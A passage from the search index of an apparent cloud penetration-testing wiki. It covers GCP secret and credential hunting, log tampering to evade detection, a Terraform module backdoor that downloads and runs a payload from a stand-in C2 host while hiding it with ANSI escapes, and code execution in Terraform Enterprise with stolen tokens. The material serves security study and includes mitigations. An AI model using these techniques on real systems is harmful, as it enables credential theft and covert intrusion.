--no-standard-images\n</code></pre> <p>You can then export the virtual disks from any image in multiple formats. The following command would export the image <code>test-image</code> in qcow2 format, allowing you to download the file and build a VM locally for further investigation:</p> <pre><code>$ gcloud compute images export --image test-image \\\n    --export-format qcow2 --destination-uri [BUCKET]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-custom-images"},{"title":"Reviewing Custom Instance Templates","text":"<p>An instance template defines instance properties to help deploy consistent configurations. These may contain the same types of sensitive data as a running instance's custom metadata. You can use the following commands to investigate:</p> <pre><code># List the available templates\n$ gcloud compute instance-templates list\n\n# Get the details of a specific template\n$ gcloud compute instance-templates describe [TEMPLATE NAME]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-custom-instance-templates"},{"title":"Reviewing Stackdriver logging","text":"<p>Stackdriver is Google's general-purpose infrastructure logging suite. There is a LOT of data that could be captured here. This can include syslog-like capabilities that report individual commands run inside Compute Instances, HTTP requests sent to load balancers or App Engine applications, network packet metadata for VPC communications, and more.</p> <p>The service account for a Compute Instance only needs WRITE access to enable logging on instance actions, but an administrator may mistakenly grant the service account both READ and WRITE access. If this is the case, you can explore logs for sensitive data.</p> <p>gcloud logging provides tools to get this done. First, you'll want to see what types of logs are available in your current project. The following shows the command and output from a test project:</p> <pre><code>$ gcloud logging logs list\nNAME\nprojects/REDACTED/logs/OSConfigAgent\nprojects/REDACTED/logs/cloudaudit.googleapis.com%2Factivity\nprojects/REDACTED/logs/cloudaudit.googleapis.com%2Fsystem_event\nprojects/REDACTED/logs/bash.history\nprojects/REDACTED/logs/compute.googleapis.com\nprojects/REDACTED/logs/compute.googleapis.com%2Factivity_log\n</code></pre> <p>The output you see will be all of the log folders in the project that contain entries. So, if you see it - something is there. Folders are generated automatically by the standard Google APIs but can also be created by any application with IAM permissions to write to logs.</p> <p>You may notice an interesting custom name in the list above (unfortunately, <code>bash.history</code> is not a default). While you should inspect all log entries, definitely take the time to manually review and understand if something is worth looking at more closely.</p> <p>You can view the logs for an individual item as follows.</p> <pre><code>$ gcloud logging read [FOLDER]\n</code></pre> <p>Omitting the folder name will just start dumping all the logs. You might want to add a <code>--LIMIT</code> flag if you do this.</p> <p>If a service account has permissions to write to log file (even the most restricted generally do), you can write arbitrary data to existing log folders and/or create new log folders and write data there as follows.</p> <pre><code>$ gcloud logging write [FOLDER] [MESSAGE]\n</code></pre> <p>Advanced write functionality (payload type, severity, etc) can be found in the gcloud logging write documentation.</p> <p>Extra-crafty attackers can get creative with this. Writing log entries may be an interesting way to distract the Blue Team folks, hide your actions, or even phish via detection/response events.</p>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-stackdriver-logging"},{"title":"Reviewing cloud functions","text":"<p>Google Cloud Functions allow you to host code that is executed when an event is triggered, without the requirement to manage a host operating system. These functions can also store environment variables to be used by the code. And what do people use environment variables for? Secrets!</p> <p>You can see if any cloud functions are available to you by running:</p> <pre><code>$ gcloud functions list\n</code></pre> <p>You can then query an individual function for its configuration, which would include any defined environment variables:</p> <pre><code>$ gcloud functions describe [FUNCTION NAME]\n</code></pre> <p>The output log of previous runs may be useful as well, which you get review with:</p> <pre><code># You can omit the function name to view all the logs\n# By default, limits to 10 lines\n$ gcloud functions logs read [FUNCTION NAME] --limit [NUMBER]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-cloud-functions"},{"title":"Reviewing app engine configurations","text":"<p>Google App Engine is another \"serverless\" offering for hosting applications, with a focus on scalability. As with Cloud Functions, there is a chance that the application will rely on secrets that are accessed at run-time via environment variables. These variables are stored in an <code>app.yaml</code> file which can be accessed as follows:</p> <pre><code># First, get a list of all available versions of all services\n$ gcloud app versions list\n\n# Then, get the specific details on a given app\n$ gcloud app describe [APP]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-app-engine-configurations"},{"title":"Reviewing cloud run configurations","text":"<p>Google Cloud Run is... yep, another \"serverless\" offering! You'll want to also look here for environment variables, but this one introduces a new potential exploitation vector. Basically, Cloud Run creates a small web server, running on port 8080, that sits around waiting for an HTTP GET request. When the request is received, a job is executed and the job log is output via an HTTP response.</p> <p>When a Cloud Run service is created, the administrator has the option to use IAM permissions to control who can start that job. They can also configure it to be completely unauthenticated, meaning that anyone with the URL can trigger the job and view the output.</p> <p>Jobs are run in containers via Kubernetes, in clusters that are fully managed by Google or partially managed via Anthos.</p> <p>Tread carefully here. We don't know what these jobs do, and triggering one without understanding that may cause heartache for your production team.</p> <p>The following commands will help you explore this vector.</p> <pre><code># First get a list of services across the available platforms\n$ gcloud run services list --platform=managed\n$ gcloud run services list --platform=gke\n\n# To learn more, export as JSON and investigate what the services do\n$ gcloud run services list --platform=managed --format=json\n$ gcloud run services list --platform=gke --format=json\n\n# Attempt to trigger a job unauthenticated\n$ curl [URL]\n\n# Attempt to trigger a job with your current gcloud authorization\n$ curl -H \\\n    \"Authorization: Bearer $(gcloud auth print-identity-token)\" \\\n    [URL]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-cloud-run-configurations"},{"title":"Reviewing AI platform configurations","text":"<p>Google AI Platform is (yep, another) \"serverless\" offering for machine learning projects.</p> <p>There are a few areas here you can look for interesting information - models and jobs. Try the following commands.</p> <pre><code>$ gcloud ai-platform models list --format=json\n$ gcloud ai-platform jobs list --format=json\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-ai-platform-configurations"},{"title":"Reviewing cloud pub/sub","text":"<p>Google Cloud Pub/Sub is a service that allows independent applications to send messages back and forth.</p> <p>Pub/Sub consists of the following core concepts:</p> <ul> <li>Topic: A logical grouping for messages</li> <li>Subscriptions: This is where applications access a stream of messages related to a topic. Some Google services can receive these via a push notification, while custom services can subscribe using a pull.</li> <li>Messages: Some data and optionally metadata.</li> </ul> <p>There is a lot of potential for attackers here in terms of affecting these messages and, in turn, the behaviour of the applications that rely on them. That's a topic for another day - this section focuses only on mostly-passive exploration of these streams using gcloud pubsub.</p> <p>The following commands should help you explore.</p> <pre><code># Get a list of topics in the project\n$ gcloud pubsub topics list\n\n# Get a list of subscriptions across all topics\n$ gcloud pubsub subscriptions list --format=json\n</code></pre> <p>The pull command will allow us to mimic a valid application, asking for messages that have not yet been acknowledged as delivered. You can mimic this behaviour with the following command, which will NOT send an ACK back and should therefore not impact other applications depending on the subscription:</p> <pre><code>$ gcloud pubsub subscriptions pull [SUBSCRIPTION NAME]\n</code></pre> <p>A savvy attacker might realize that they could intentionally ACK messages to ensure they are never received by the valid applications. This could be helpful to evade some detection implementations.</p> <p>However, you may have better results asking for a larger set of data, including older messages. This has some prerequisites and could impact applications, so make sure you really know what you're doing.</p>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-cloud-pubsub"},{"title":"Reviewing cloud Git repositories","text":"<p>Google's Cloud Source Repositories are Git designed to be private storage for source code. You might find useful secrets here, or use the source to discover vulnerabilities in other applications.</p> <p>You can explore the available repositories with the following commands:</p> <pre><code># enumerate what's available\n$ gcloud source repos list\n\n# clone a repo locally\n$ gcloud source repos clone [REPO NAME]\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-cloud-git-repositories"},{"title":"Reviewing cloud filestore instances","text":"<p>Google Cloud Filestore is NAS for Compute Instances and Kubernetes Engine instances. You can think of this like any other shared document repository - a potential source of sensitive info.</p> <p>If you find a filestore available in the project, you can mount it from within your compromised Compute Instance. Use the following command to see if any exist.</p> <pre><code>$ gcloud filestore instances list --format=json\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-cloud-filestore-instances"},{"title":"Taking a crack at Kubernetes","text":"<p>Google Kubernetes Engine is managed Kubernetes as a service.</p> <p>Kubernetes is worthy of its own tutorial, particularly if you are looking to break out of a container into the wider GCP project. We're going to keep it short and sweet for now.</p> <p>First, you can check to see if any Kubernetes clusters exist in your project.</p> <pre><code>$ gcloud container clusters list\n</code></pre> <p>If you do have a cluster, you can have <code>gcloud</code> automatically configure your <code>~/.kube/config</code> file. This file is used to authenticate you when you use kubectl, the native CLI for interacting with K8s clusters. Try this command.</p> <pre><code>$ gcloud container clusters get-credentials [CLUSTER NAME] --region [REGION]\n</code></pre> <p>Then, take a look at the <code>~/.kube/config</code> file to see the generated credentials. This file will be used to automatically refresh access tokens based on the same identity that your active <code>gcloud</code> session is using. This of course requires the correct permissions in place.</p> <p>Once this is set up, you can try the following command to get the cluster configuration.</p> <pre><code>kubectl cluster-info\n</code></pre> <p>You can read more about <code>gcloud</code> for containers here.</p>","location":"gcp/post_exploitation/treasure_hunting/#taking-a-crack-at-kubernetes"},{"title":"Reviewing secrets management","text":"<p>Google Secrets Management is a vault-like solution for storing passwords, API keys, certificates, and other sensitive data. As of this writing, it is currently in beta.</p> <p>If in use, this could be a gold mine. Give it a shot as follows:</p> <pre><code># First, list the entries\n$ gcloud beta secrets list\n\n# Then, pull the clear-text of any secret\n$ gcloud beta secrets versions access 1 --secret=\"[SECRET NAME]\"\n</code></pre> <p>Note that changing a secret entry will create a new version, so it's worth changing the <code>1</code> in the command above to a <code>2</code> and so on.</p> <p>As this offering is still in beta, these commands are likely to change with time.</p>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-secrets-management"},{"title":"Searching the local system for secrets","text":"<p>Temporary directories, history files, environment variables, shell scripts, and various world-readable files are usually a treasure trove for secrets. You probably already know all that, so here are some regexes that will come in handy when grepping for things specific to GCP.</p> <p>Each grep command is using the <code>-r</code> flag to search recursively, so first set the TARGET_DIR variable and then fire away.</p> <pre><code>TARGET_DIR=\"/path/to/whatever\"\n\n# Service account keys\ngrep -Pzr \"(?s){[^{}]*?service_account[^{}]*?private_key.*?}\" \\\n    \"$TARGET_DIR\"\n\n# Legacy GCP creds\ngrep -Pzr \"(?s){[^{}]*?client_id[^{}]*?client_secret.*?}\" \\\n    \"$TARGET_DIR\"\n\n# Google API keys\ngrep -Pr \"AIza[a-zA-Z0-9\\\\-_]{35}\" \\\n    \"$TARGET_DIR\"\n\n# Google OAuth tokens\ngrep -Pr \"ya29\\.[a-zA-Z0-9_-]{100,200}\" \\\n    \"$TARGET_DIR\"\n\n# Generic SSH keys\ngrep -Pzr \"(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[\n\n    a-zA-Z0-9/\\+=\\n-]*?END[ A-Z]*?PRIVATE KEY-----\" \\\n    \"$TARGET_DIR\"\n\n# Signed storage URLs\ngrep -Pir \"storage.googleapis.com.*?Goog-Signature=[a-f0-9]+\" \\\n    \"$TARGET_DIR\"\n\n# Signed policy documents in HTML\ngrep -Pzr '(?s)&lt;form action.*?googleapis.com.*?name=\"signature\" value=\".*?\"&gt;' \\\n    \"$TARGET_DIR\"\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#searching-the-local-system-for-secrets"},{"title":"Google Cloud CLI","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p> <p>It is likely that the box you land on will have the GCP SDK tools installed and configured. A quick way to verify that things are set up is to run the following command:</p> <pre><code>gcloud config list\n</code></pre> <p>If properly configured, you should get some output detailing the current service account and project in use.</p> <p>The gcloud command set is pretty extensive, supports tab completion, and has excellent online and built-in documentation. You can also install it locally on your own machine and use it with credential data that you obtain. Cloud APIs</p> <p>The gcloud command is really just a way of automating Google Cloud API calls. However, you can also perform them manually. Understanding the API endpoints and functionality can be very helpful when you're operating with a very specific set of permissions, and trying to work out exactly what you can do.</p> <p>You can see what the raw HTTP API call for any individual <code>gcloud</code> command is simply by appending <code>--log-http</code> to the command.  </p>","location":"gcp/tools/gcloud/"},{"title":"Terraform ANSI Escape","text":"<p>Original Research: Joern Schneeweisz</p> <p>When performing a Terraform apply from a local workstation, Terraform will output a list of resources it has created, updated, or deleted. Because this is taking place in a terminal, we can potentially use ANSI escape codes to alter this output. This would allow us to hide or obfuscate malicious activity, such as in a malicious Terraform module.</p> <p>Take for example the following Terraform code.</p> main.tf<pre><code>resource \"null_resource\" \"hypothetical_ec2_instance\" {\n}\n\nresource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload\"\n  }\n}\n</code></pre> <p>In this example, we are using a local-exec provisioner to run shell commands. If we were to backdoor a module or git repository storing Terraform configurations, and a developer were to download them and run them on their workstation, this would run the shell commands on their workstation.</p>  <p>Tip</p> <p>As an alternative to local-exec, you can also use external_provider.</p>  <p>The problem is that this output would get displayed to the user, for example:</p> <p></p> <p>To solve this, we can use ANSI escape codes to modify this output. It is worth noting that the specific sequences we will need to use will depend on the terminal type the victim is using. The following example is using gnome-terminal on Ubuntu.</p> <pre><code>\\033[2K # Clears the current line\n\\033[A  # Moves the cursor to the previous line\n</code></pre> <p>So, we can modify our payload to the following to hide the malicious activity.</p> main.tf<pre><code>resource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload; echo -e '\\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A'\"\n  }\n}\n</code></pre> <p>And this is the output:</p> <p></p>","location":"terraform/terraform_ansi_escape_evasion/"},{"title":"Terraform Enterprise: Attack the Metadata Service","text":"<p>Terraform Enterprise is a self-hosted version of Terraform Cloud, allowing organizations to maintain their own private instance of Terraform. There are many benefits for an enterprise to run this, however, there is also a default configuration that Red Teamers and Penetration Testers can potentially take advantage of.</p> <p>If Terraform Enterprise is deployed to a VM from a cloud provider we may be able to access the instance metadata service and leverage those credentials for further attacks.</p> <p>\"By default, Terraform Enterprise does not prevent Terraform operations from accessing the instance metadata service, which may contain IAM credentials or other sensitive data\" (source)</p>  <p>Note</p> <p>While the focus of this article is on targeting the metadata service, it is worth noting that gaining code execution inside a Terraform run may provide other avenues for attack. For example, environment variables could be leaked which may contain sensitive credentials.</p>","location":"terraform/terraform_enterprise_metadata_service/"},{"title":"Remote (Code) Execution","text":"<p>For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a <code>terraform apply</code> or <code>terraform plan</code> all of that activity took place on the local machine (reaching out to cloud APIs, tracking state, etc.)</p> <p>An exciting feature of Terraform Enterprise (and Cloud) is the idea of Remote Execution, wherein all those operations take place server-side. In Terraform Cloud the execution takes place in \"disposable virtual machines\". In Terraform Enterprise however, it takes place in \"disposable Docker containers\". </p> <p>This introduces an interesting opportunity; If you compromise credentials to initiate a <code>plan</code> or <code>apply</code> operation (or otherwise have access to them. I.E insider threat) we can execute code in a Docker container on the Terraform Enterprise server.</p>  <p>Note</p> <p>It is possible to disable Remote Execution via a configuration however this is discouraged. \"Many of Terraform Cloud's features rely on remote execution, and are not available when using local operations. This includes features like Sentinel policy enforcement, cost estimation, and notifications.\"</p>","location":"terraform/terraform_enterprise_metadata_service/#remote-code-execution"},{"title":"Docker Containers and Metadata Services","text":"<p>Aside from container escapes, running user-supplied code in a container is an interesting opportunity in a cloud context. The specifics will depend upon the cloud provider. For example, in AWS, an attacker could target the Instance Metadata Service. This would provide the attacker IAM credentials for the IAM role associated with the EC2 instance.</p> <p>Other opportunities include things such as the instance user data, which may help enumerate what software is on the host, potentially leak secrets, or reveal what the associated IAM role has access to. It is also possible to use this to pivot to other machines in the VPC/subnet which would otherwise be inaccessible, or to attempt to hit services exposed on localhost on the TFE host (hitting 172.17.0.1).</p>","location":"terraform/terraform_enterprise_metadata_service/#docker-containers-and-metadata-services"},{"title":"Attack Prevention","text":"<p>It is worth noting that there are two potential methods to mitigate this attack. The first is the configuration of restrict_worker_metadata_access in the Terraform Enterprise settings. This is not the default, meaning that out of the box Terraform operations have access to the metadata service and its credentials.</p> <p>The second option would depend upon the cloud provider, but options to harden or secure the Metadata Service can also be used. For example, IMDSv2 in an AWS situation would prevent the Docker container from reaching the Metadata Service.</p>  <p>Note</p> <p>Nothing should prevent these two methods from working at the same time. It is a good idea to require IMDSv2 of all EC2 instances in your environment.</p>","location":"terraform/terraform_enterprise_metadata_service/#attack-prevention"},{"title":"Walkthrough","text":"<p>Warning</p> <p>This walkthrough and screenshots are not tested against Terraform Enterprise (this is a free/open source project, we don't have access to a Terraform Enterprise instance for demonstration purposes). As such it is being demoed on Terraform Cloud which, while similar, is not a 1-1 copy. If you are attempting to exploit this against your organization's TFE instance, minor tweaks may be needed. (We are open to Pull Requests!)</p>   <p>Note</p> <p>If you already have a configured and initialized Terraform backend, you can skip to the Executing Code section. The following walkthrough will demonstrate the entire process from finding the token to initializing the backend.</p>","location":"terraform/terraform_enterprise_metadata_service/#walkthrough"},{"title":"Acquire a Terraform API Token","text":"<p>To begin, you'll first need to 'acquire' a Terraform API Token. These tokens can be identified by the <code>.atlasv1.</code> substring in them.</p> <p>As for where you would get one, there are a number of possible locations. For example, developer's may have them locally on their workstations in <code>~/.terraform.d/</code>, you may find them in CI/CD pipelines, inappropriately stored in documentation, pull them from a secrets vault, create one with a developer's stolen credentials, etc.</p>","location":"terraform/terraform_enterprise_metadata_service/#acquire-a-terraform-api-token"},{"title":"Identify the Organization and Workspace Names","text":"<p>With access to a valid API token, we now need to find an Organization and Workspace we can use to be nefarious. The good news is that this information is queryable using the token. We can use a tool such as jq to parse and display the JSON.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations | jq\n</code></pre>  <p></p>  <p>Next, we need to identify a workspace we can use. Again, this can be quereyed using the organization <code>id</code> we gathered in the previous step.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations/&lt;Organization ID&gt;/workspaces | jq\n</code></pre>  <p></p>","location":"terraform/terraform_enterprise_metadata_service/#identify-the-organization-and-workspace-names"},{"title":"Configure the Remote Backend","text":"<p>Now that we have the organization and workspace id's from the previous step, we can configure the remote backend. To do this, you can use this example as a template with one exception. We will add a <code>hostname</code> value which is the hostname of the Terraform Enterprise instance. You can store this in a file named <code>backend_config.tf</code>. backend_config.tf<pre><code>terraform {\n  backend \"remote\" {\n    hostname = \"{{TFE_HOSTNAME}}\"\n    organization = \"{{ORGANIZATION_NAME}}\"\n\n    workspaces {\n      name = \"{{WORKSPACE_NAME}}\"\n    }\n  }\n}\n</code></pre></p>","location":"terraform/terraform_enterprise_metadata_service/#configure-the-remote-backend"},{"title":"Initialize the Backend","text":"<p>With the backend configuration file created we can initialize the backend with the following command.</p> <pre><code>terraform init --backend-config=\"token=$TFE_TOKEN\"\n</code></pre> <p>If everything has worked as it should, you should get a <code>Terraform has been successfully initialized</code> notification. To test this, you can perform a <code>terraform state list</code> to list the various state objects.</p>","location":"terraform/terraform_enterprise_metadata_service/#initialize-the-backend"},{"title":"Executing Code","text":"<p>Now that our backend has been properly configured and we can access the remote state, we can attempt to execute code. There are several ways this can be done (such as using a local-exec provisioner) however, for our purposes we will be using the External Provider.</p> <p>\"<code>external</code> is a special provider that exists to provide an interface between Terraform and external programs\".</p> <p>What this means is that we can execute code during the Terraform <code>plan</code> or <code>apply</code> operations by specifying a program or script to run.</p> <p>To do this, we will create an <code>external provider</code> in our existing <code>backend_config.tf</code> file (if you already have an existing Terraform project you can add this block to those existing files).</p> backend_config.tf<pre><code>...\n\ndata \"external\" \"external_provider\" {\n    program = [\"python3\", \"wrapper.py\"]\n}\n\noutput \"external_provider_example\" {\n    value = data.external.external_provider\n}\n</code></pre> <p>You may be wondering what the <code>wrapper.py</code> file is. In order to use the <code>external</code> provider, we must \"implement a specific protocol\" (source), which is JSON. To do this, we will wrap the result of the code execution in JSON so it can be returned.</p>  <p>Note</p> <p>The wrapper script is not strictly required if you aren't interested in getting the output. If your goal is simply to execute a C2 payload, you can include the binary in the project directory and then execute it.</p> <p>Wrapping the output in JSON allows us to get the response output.</p>  <p>Our wrapper script looks like the following (feel free to change to your needs).</p> wrapper.py<pre><code>import json\nimport os\n\nstream = os.popen('id')\noutput = stream.read()\nresult = { \"result\" : output }\n\nprint(json.dumps(result))\n</code></pre>","location":"terraform/terraform_enterprise_metadata_service/#executing-code"},{"title":"Terraform Plan","text":"<p>Now that the wrapper script is created (and modified), we can execute code via <code>terraform plan</code>. This is a non-destructive action, which will evaluate our local configuration vs's the remote state. In addition, it will execute our remote provider and return the result to us.</p>  <p></p>   <p>Warning</p> <p>Upon executing <code>terraform plan</code> you may encounter errors for various reasons depending upon the remote state. Those errors will need to be handled on a case by case basis. Typically this involves modifying your <code>.tf</code> files to suit the remote state. This can typically be figured out based on the results of <code>terraform state pull</code>.</p>  <p>From here, we can modify our wrapper script to do a variety of things such as (the purpose of this article) reaching out to the metadata service and pulling those credentials.</p>  <p>Note</p> <p>The results of this run are logged elsewhere. Please do not leak secrets or other sensitive information to parties who do not have a need for the information. A more efficient method would be to use a C2 platform such as Mythic (or even just a TLS encrypted reverse shell) to exfiltrate the credentials.</p>","location":"terraform/terraform_enterprise_metadata_service/#terraform-plan"}]}